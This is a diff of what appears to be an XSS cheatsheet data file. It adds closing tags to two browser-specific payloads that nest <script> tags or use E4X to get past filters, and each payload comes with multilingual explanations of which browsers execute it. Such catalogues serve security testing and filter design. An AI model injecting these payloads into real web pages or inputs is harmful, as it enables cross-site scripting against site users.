@@ -2041,7 +2041,7 @@ var items =
             'cs' : 'Tagy vložené do jiných tagů pro oklamání bezpečnostních filtrů',
             'de' : ''
         },
-        'data'       : '<b <script>%js_alert%//</script>0</script>',
+        'data'       : '<b <script>%js_alert%//</script>0</script></b>',
         'description': {
             'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
             'ja' : '',
@@ -2075,7 +2075,7 @@ var items =
             'cs' : 'E4X použitý k uzavření otevřeného tagu <SCRIPT> vytvořením nového E4X objektu.',
             'de' : ''
         },
-        'data'       : '<b><script<b></b><alert(1)</script </b>',
+        'data'       : '<b><script<b></b><alert(1)</script </b></b>',
         'description': {
             'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
             'ja' : '',
